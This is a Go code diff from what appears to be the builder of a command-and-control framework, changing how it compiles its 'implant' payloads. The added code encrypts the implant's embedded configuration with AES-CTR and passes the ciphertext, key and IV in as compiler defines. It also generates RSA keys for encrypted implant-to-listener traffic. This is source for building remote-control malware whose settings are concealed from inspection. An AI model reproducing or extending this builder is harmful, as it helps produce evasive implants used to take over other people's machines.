@@ -27,6 +27,7 @@ func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilde
 	var builder = new(AgentBuilder)
 
 	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent" + "/"
+	builder.RSAKeyPath = path + "/" + "Config" + "/"
 
 	ConfigPath := path + "\\Config\\"
 	BuilderConfig, err := Utility.ParseConfig(ConfigPath, "Builder.Config", &builder.CompilerOptions.Config)
@@ -134,21 +135,54 @@ func (ab *AgentBuilder) Build() bool {
 		ab.SetOutputPath(ab.CompileDir + Types.PayloadName + "." + ab.FileExtenstion)
 	}
 
+	//create config bytes that will be used as a preprocessor definition for the implant.
 	Config, err := ab.PatchConfig()
 	if err != nil {
 		log.Println("[error] attempting to create patch config: ", err)
 		return false
 	}
-	ConfigByteString := "{"
-	for i := range Config {
-		if i == (len(Config) - 1) {
-			ConfigByteString += fmt.Sprintf("0x%02x", Config[i])
+
+	//encrypt the config bytes
+	EncryptedConfig, Key, Iv, err := Crypt.AESCTREncrypt(Config)
+	if err != nil {
+		log.Println("[error] attempting to encrypt config: ", err)
+		return false
+	}
+	//create byte strings to pass as preprocessor definitions for:
+	//key
+	KeyByteString := "{"
+	for i := range Key {
+		if i == (len(Key) - 1) {
+			KeyByteString += fmt.Sprintf("0x%02x", Key[i])
 		} else {
-			ConfigByteString += fmt.Sprintf("0x%02x\\,", Config[i])
+			KeyByteString += fmt.Sprintf("0x%02x,", Key[i])
+		}
+	}
+	KeyByteString += "}"
+	//IV
+	IvByteString := "{"
+	for i := range Iv {
+		if i == (len(Iv) - 1) {
+			IvByteString += fmt.Sprintf("0x%02x", Iv[i])
+		} else {
+			IvByteString += fmt.Sprintf("0x%02x,", Iv[i])
+		}
+	}
+	IvByteString += "}"
+	//config
+	ConfigByteString := "{"
+	for i := range EncryptedConfig {
+		if i == (len(EncryptedConfig) - 1) {
+			ConfigByteString += fmt.Sprintf("0x%02x", EncryptedConfig[i])
+		} else {
+			ConfigByteString += fmt.Sprintf("0x%02x,", EncryptedConfig[i])
 		}
 	}
 	ConfigByteString += "}"
+	//add all preprocessor definitions to the compiler command
 	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_KEY_BYTES="+KeyByteString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_IV_BYTES="+IvByteString)
 
 	if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
 		abs, err := filepath.Abs(ab.CompilerOptions.Config.Compiler64)
@@ -334,6 +368,12 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 			}
 		}
 	}
+	//generate encryption keys for implant / listener communication.
+	publicRSAKeyBytes, err := Crypt.GenerateRSAKeys(ab.RSAKeyPath, ab.ImplantConfig.Name)
+	if err != nil {
+		log.Println("[error] attempting to generate RSA keys", err)
+	}
+	AgentConfig.AddBytes(publicRSAKeyBytes)
 
 	return AgentConfig.GetBuffer(), nil
 }
@@ -354,6 +394,9 @@ func (ab *AgentBuilder) CompileCmd(cmd []string) bool {
 	CommandLine.Stdout = &stdout
 	CommandLine.Stderr = &stderr
 	CommandLine.Args = append(CommandLine.Args, cmd...)
+
+	//TODO remove debug output
+	log.Println("[info] compiling agent with command: ", CommandLine.Args)
 
 	err = CommandLine.Run()
 	if err != nil {
